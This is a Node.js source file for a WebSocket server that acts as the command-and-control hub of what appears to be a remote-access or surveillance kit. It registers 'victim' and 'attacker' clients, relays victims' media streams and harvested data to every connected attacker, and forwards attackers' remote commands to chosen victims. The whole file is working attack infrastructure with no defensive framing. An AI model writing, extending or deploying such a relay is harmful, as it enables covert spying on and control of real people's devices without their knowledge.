const WebSocket = require('ws');
const crypto = require('crypto');

class WebSocketManager {
    constructor(server) {
        this.wss = new WebSocket.Server({ server });
        this.clients = new Map();
        this.victimConnections = new Map();
        this.attackerConnections = new Map();
        
        this.setupWebSocket();
    }

    setupWebSocket() {
        this.wss.on('connection', (ws, req) => {
            const clientId = this.generateClientId();
            ws.clientId = clientId;
            
            ws.on('message', (data) => {
                this.handleMessage(ws, data);
            });

            ws.on('close', () => {
                this.handleDisconnection(ws);
            });

            ws.on('error', (error) => {
                this.handleError(ws, error);
            });

            // Send welcome message
            this.sendToClient(ws, {
                type: 'connected',
                clientId: clientId,
                timestamp: Date.now()
            });
        });
    }

    handleMessage(ws, data) {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                case 'victim_register':
                    this.registerVictim(ws, message);
                    break;
                case 'attacker_register':
                    this.registerAttacker(ws, message);
                    break;
                case 'media_stream':
                    this.broadcastToAttackers(message.victimId, message);
                    break;
                case 'remote_command':
                    this.forwardToVictim(message.victimId, message);
                    break;
                case 'data_update':
                    this.handleDataUpdate(ws, message);
                    break;
                case 'ping':
                    this.sendToClient(ws, { type: 'pong', timestamp: Date.now() });
                    break;
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    }

    registerVictim(ws, message) {
        const { victimId, userAgent, ip } = message;
        
        this.victimConnections.set(victimId, {
            ws: ws,
            victimId: victimId,
            userAgent: userAgent,
            ip: ip,
            connectedAt: Date.now(),
            lastActivity: Date.now()
        });

        ws.victimId = victimId;

        // Notify all attackers about new victim
        this.broadcastToAttackers('system', {
            type: 'victim_connected',
            victimId: victimId,
            userAgent: userAgent,
            ip: ip,
            timestamp: Date.now()
        });

        console.log(`✅ Victim connected: ${victimId}`);
    }

    registerAttacker(ws, message) {
        const { attackerId, name } = message;
        
        this.attackerConnections.set(attackerId, {
            ws: ws,
            attackerId: attackerId,
            name: name,
            connectedAt: Date.now()
        });

        ws.attackerId = attackerId;

        // Send current victims to attacker
        const currentVictims = Array.from(this.victimConnections.values());
        this.sendToClient(ws, {
            type: 'current_victims',
            victims: currentVictims.map(v => ({
                victimId: v.victimId,
                userAgent: v.userAgent,
                ip: v.ip,
                connectedAt: v.connectedAt
            }))
        });

        console.log(`🎯 Attacker connected: ${name}`);
    }

    broadcastToAttackers(victimId, message) {
        this.attackerConnections.forEach((attacker, attackerId) => {
            if (attacker.ws.readyState === WebSocket.OPEN) {
                this.sendToClient(attacker.ws, {
                    ...message,
                    victimId: victimId,
                    timestamp: Date.now()
                });
            }
        });
    }

    forwardToVictim(victimId, message) {
        const victim = this.victimConnections.get(victimId);
        if (victim && victim.ws.readyState === WebSocket.OPEN) {
            this.sendToClient(victim.ws, message);
        }
    }

    handleDataUpdate(ws, message) {
        const victimId = ws.victimId;
        if (victimId) {
            this.broadcastToAttackers(victimId, {
                type: 'victim_data',
                victimId: victimId,
                dataType: message.dataType,
                data: message.data,
                timestamp: Date.now()
            });
        }
    }

    sendToClient(ws, message) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(message));
        }
    }

    handleDisconnection(ws) {
        if (ws.victimId) {
            const victimId = ws.victimId;
            this.victimConnections.delete(victimId);
            
            // Notify attackers about victim disconnect
            this.broadcastToAttackers('system', {
                type: 'victim_disconnected',
                victimId: victimId,
                timestamp: Date.now()
            });
            
            console.log(`❌ Victim disconnected: ${victimId}`);
        }
        
        if (ws.attackerId) {
            this.attackerConnections.delete(ws.attackerId);
            console.log(`🎯 Attacker disconnected: ${ws.attackerId}`);
        }
    }

    handleError(ws, error) {
        console.error('WebSocket error:', error);
    }

    generateClientId() {
        return crypto.randomBytes(8).toString('hex');
    }

    // Send command to specific victim
    sendCommandToVictim(victimId, command, data = {}) {
        const victim = this.victimConnections.get(victimId);
        if (victim && victim.ws.readyState === WebSocket.OPEN) {
            this.sendToClient(victim.ws, {
                type: 'remote_command',
                command: command,
                data: data,
                timestamp: Date.now()
            });
            return true;
        }
        return false;
    }

    // Get all connected victims
    getConnectedVictims() {
        return Array.from(this.victimConnections.values()).map(v => ({
            victimId: v.victimId,
            userAgent: v.userAgent,
            ip: v.ip,
            connectedAt: v.connectedAt,
            lastActivity: v.lastActivity
        }));
    }

    // Get victim count
    getVictimCount() {
        return this.victimConnections.size;
    }

    // Get attacker count
    getAttackerCount() {
        return this.attackerConnections.size;
    }
}

module.exports = WebSocketManager;
